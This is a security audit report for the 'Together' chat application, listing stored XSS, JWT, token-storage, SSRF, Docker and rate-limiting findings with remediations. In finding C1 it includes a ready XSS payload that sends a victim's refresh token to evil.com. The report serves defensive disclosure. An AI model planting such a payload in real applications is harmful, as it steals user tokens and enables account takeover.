# Together Security Audit — 2026-03-12

## Scope

Full codebase review: Rust backend (server/), React web client (clients/web/), Docker infrastructure.

---

## Executive Summary

The codebase demonstrates strong security practices in most areas: parameterized queries throughout (no SQL injection), MIME-type detection from magic bytes, SSRF protection with DNS-pinning, bcrypt password hashing, JWT type separation (access vs refresh), and meaningful security response headers. However, **one critical and several high-severity issues** require attention before production deployment.

---

## Findings

### CRITICAL

---

#### [C1] Stored XSS in Search Result Highlight Rendering

**Files:**

- `clients/web/src/components/search/SearchModal.tsx:223`
- `server/src/handlers/search.rs:77-80`

**Description:**
PostgreSQL's `ts_headline()` wraps matched search terms in `<mark>` tags **inside the raw, user-supplied message content**. It does not strip HTML. The surrounding text — including any HTML tags inserted by a malicious user — is returned verbatim. The web client renders this string via `innerHTML`, executing any embedded scripts.

**Attack scenario:**

1. Attacker sends a message: `hello <img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('together_refresh_token'))"> world`
2. Victim searches for "hello" or "world"
3. Server returns `ts_headline()` containing the intact `<img>` tag
4. Client renders it via innerHTML — script executes, stealing the 7-day refresh token

**Key code:**

```tsx
// SearchModal.tsx:221-224
<div dangerouslySetInnerHTML={{ __html: result.highlight }} />
```

```sql
-- search.rs:77-78
ts_headline('english', m.content, plainto_tsquery('english', $1),
    'StartSel=<mark> StopSel=</mark>...' ) AS highlight
```

**Remediation:**
Option A (server-side): Before returning highlight, sanitize it: strip all tags except `<mark>`, escape remaining HTML entities.
Option B (client-side): Use DOMPurify with `ALLOWED_TAGS: ['mark']` to sanitize the string before rendering.

**Status:** Open

---

### HIGH

---

#### [H1] JWT Algorithm Not Explicitly Pinned

**File:** `server/src/auth/mod.rs:100-110`

`validate_token()` uses `Validation::default()` which accepts HS256/HS384/HS512. Best practice is to explicitly constrain to `Algorithm::HS256`:

```rust
let mut validation = Validation::new(Algorithm::HS256);
decode::<Claims>(token, &DecodingKey::from_secret(secret.as_bytes()), &validation)
```

**Status:** Open

---

#### [H2] Access Token Exposed in WebSocket URL Query Parameter

**File:** `server/src/websocket/handler.rs:42-44`

JWT is passed as `/ws?token=<jwt>`. This token appears in server access logs, nginx logs, browser history, and Referer headers. The code comment acknowledges this; the 15-minute lifetime limits exposure but doesn't eliminate it.

**Remediation:** Pass token in the `Sec-WebSocket-Protocol` header during upgrade, or send it as the first authenticated frame after connection with a 5-second handshake timeout.

**Status:** Open

---

#### [H3] Both Tokens Stored in `localStorage`

**File:** `clients/web/src/stores/authStore.ts:41,42,58,59`

Access and refresh tokens in `localStorage` are accessible to any JavaScript on the page. XSS (e.g., C1) can exfiltrate both. The refresh token is valid 7 days.

**Remediation:** Store refresh token in `httpOnly; SameSite=Strict; Secure` cookie. Store access token in JS memory only (no `localStorage`).

**Status:** Open

---

#### [H4] No Account-Level Login Failure Tracking

**File:** `server/src/handlers/auth.rs:124-183`

Per-IP rate limiting (2 req/s) is bypassed by attackers with multiple IPs. There is no per-username failure counter to detect and block credential stuffing against a specific account.

**Remediation:** Track `(username, window)` failure counts in the database. Lock after N failures within a sliding window.

**Status:** Open

---

#### [H5] Giphy API Key Embedded in Logged URL

**File:** `server/src/handlers/giphy.rs:41-47`

```rust
let url = format!(
    "https://api.giphy.com/v1/gifs/search?api_key={}&q={}...",
    api_key, ...
);
```

`tower-http` at debug level logs this full URL, exposing the API key in logs.

**Remediation:** Use `Authorization: Bearer <key>` header (Giphy supports this) or pass via a custom header, keeping the key out of the URL.

**Status:** Open

---

#### [H6] Docker Container Runs as Root

**File:** `Dockerfile`

No `USER` directive. Server process runs as UID 0. RCE vulnerability = root access in container.

**Remediation:**

```dockerfile
RUN adduser --disabled-password --uid 1001 together && chown -R together /app/uploads
USER together
```

**Status:** Open

---

### MEDIUM

---

#### [M1] SSRF: IPv4-Mapped IPv6 Addresses Not Blocked

**File:** `server/src/handlers/link_preview.rs:48-68`

`is_private_ip()` does not handle `::ffff:127.0.0.1` (IPv4-mapped IPv6 loopback). This address passes the private IP check.

**Remediation:** Add to the IPv6 arm:

```rust
|| v6.to_ipv4_mapped().map(|v4| is_private_ip(IpAddr::V4(v4))).unwrap_or(false)
```

Also consider blocking `100.64.0.0/10` (CGNAT/cloud-shared range).

**Status:** Open

---

#### [M2] No Rate Limiting on WebSocket Messages

**File:** `server/src/websocket/handler.rs:165-213`

Authenticated users can flood the server with TypingStart (2 DB queries each), VoiceSignal (1 DB query + routing), and PresenceUpdate (2 DB queries + N broadcasts) events without any throttle.

**Remediation:** Apply per-connection message rate limiting using `governor`, e.g., 10 messages/second burst 20.

**Status:** Open

---

#### [M3] Upload Directory World-Readable (0o755)

**Files:** `server/src/main.rs:127`, `server/src/handlers/attachments.rs:193`

Upload dirs set to `0o755` — readable by all processes on the host. Should be `0o750`.

**Status:** Open

---

#### [M4] No Audit Logging for Sensitive Operations

No structured audit trail for: login attempts, message deletions by server owners, file downloads, server deletions, etc. Inhibits incident response.

**Remediation:** Add `audit_events` table or structured log entries for security-relevant operations.

**Status:** Open

---

#### [M5] `text/plain` MIME Fallback Accepts Any Valid-UTF-8 Binary

**File:** `server/src/handlers/attachments.rs:136-148`

When `infer::get()` returns `None`, the server accepts the file as `text/plain` if it is valid UTF-8. Some binary formats (XML-based, source code with embedded scripts) are valid UTF-8 and would pass this check.

**Remediation:** Reject files that don't match a recognized magic-byte type. Do not fall back to `text/plain` for unknown content.

**Status:** Open

---

#### [M6] No Server/User Membership Limits

**File:** `server/src/handlers/servers.rs:71-123, 270-310`

No cap on servers per user or members per server. Could lead to resource exhaustion and quadratic broadcast fan-out.

**Remediation:** Add `MAX_SERVERS_PER_USER = 100` and `MAX_MEMBERS_PER_SERVER = 1000` (or similar) guards.

**Status:** Open

---

### LOW

---

#### [L1] JWT Validation Errors Logged at WARN Level with Full Details

**File:** `server/src/auth/mod.rs:107`
Detailed JWT error messages logged at WARN may leak algorithm/clock information to log aggregation systems.
**Remediation:** Log at DEBUG or sanitize to a generic message.

---

#### [L2] No `Cache-Control: no-store` on Auth Responses

Auth endpoints don't set `Cache-Control: no-store`. Tokens could be cached by reverse proxies.
**Remediation:** Add `Cache-Control: no-store` to `/auth/*` responses.

---

#### [L3] Email Field Accepted but Never Verified

`email` is optional at registration, never validated. Cannot be used for recovery.
**Remediation:** Remove or implement verification.

---

#### [L4] Content-Disposition Uses Unsanitized Original Filename

**File:** `server/src/handlers/attachments.rs:340-347`
`attachment.filename` (original, pre-sanitization) is used in the `Content-Disposition` header. If it contains CRLF characters (which `sanitize_filename` would strip), header injection is possible — but the original is stored in DB before sanitization.
**Remediation:** Store the sanitized filename in the DB instead of the original.

---

#### [L5] Dockerfile Missing HEALTHCHECK

**Remediation:**

```dockerfile
HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost:8080/health || exit 1
```

---

#### [L6] No Maximum Session Count Per User

**File:** `server/src/handlers/auth.rs:155-169`
Only expired sessions are cleaned up on login. Active sessions accumulate unbounded.
**Remediation:** Delete oldest sessions when count exceeds `MAX_SESSIONS_PER_USER` (e.g., 25).

---

## Summary Table

| ID  | Severity | Title                                       | Status |
| --- | -------- | ------------------------------------------- | ------ |
| C1  | Critical | Stored XSS in search highlight rendering    | Open   |
| H1  | High     | JWT algorithm not pinned                    | Open   |
| H2  | High     | Access token in WebSocket URL               | Open   |
| H3  | High     | Tokens in localStorage                      | Open   |
| H4  | High     | No account-level login failure tracking     | Open   |
| H5  | High     | Giphy API key in logged URL                 | Open   |
| H6  | High     | Docker container runs as root               | Open   |
| M1  | Medium   | SSRF: IPv4-mapped IPv6 not blocked          | Open   |
| M2  | Medium   | No WebSocket message rate limiting          | Open   |
| M3  | Medium   | Upload directory 0o755 (world-readable)     | Open   |
| M4  | Medium   | No audit logging                            | Open   |
| M5  | Medium   | text/plain fallback for UTF-8 binary files  | Open   |
| M6  | Medium   | No server/user membership limits            | Open   |
| L1  | Low      | JWT errors logged at WARN with full details | Open   |
| L2  | Low      | No Cache-Control on auth responses          | Open   |
| L3  | Low      | Email unverified                            | Open   |
| L4  | Low      | Content-Disposition with original filename  | Open   |
| L5  | Low      | Dockerfile missing HEALTHCHECK              | Open   |
| L6  | Low      | No max session count per user               | Open   |

## What Is Done Well

- Parameterized queries throughout — no SQL injection risk anywhere
- MIME type detection from magic bytes (not client headers)
- SSRF protection with DNS resolution + IP pinning for link preview
- bcrypt cost 12 for password hashing; max 128-byte input to prevent DoS
- Separate access/refresh token types enforced server-side
- Security response headers: X-Content-Type-Options, X-Frame-Options, CSP, HSTS, Referrer-Policy
- JWT secret required >=32 chars; server refuses to start without it
- Upload file permissions explicitly strip execute bit (0o644)
- Path traversal protection in file serving + DB URL verification before serving
- Rate limiting on auth endpoints (2 req/s) and global (10 req/s)
- Metrics endpoint restricted to loopback-only connections
- Voice signal relay requires co-channel membership verification in DB
- Typing indicator validates server membership before broadcasting
- Config debug impl redacts JWT secret and database URL
- SHA-256 refresh token hashing allows deterministic DB lookup without timing sidechannels
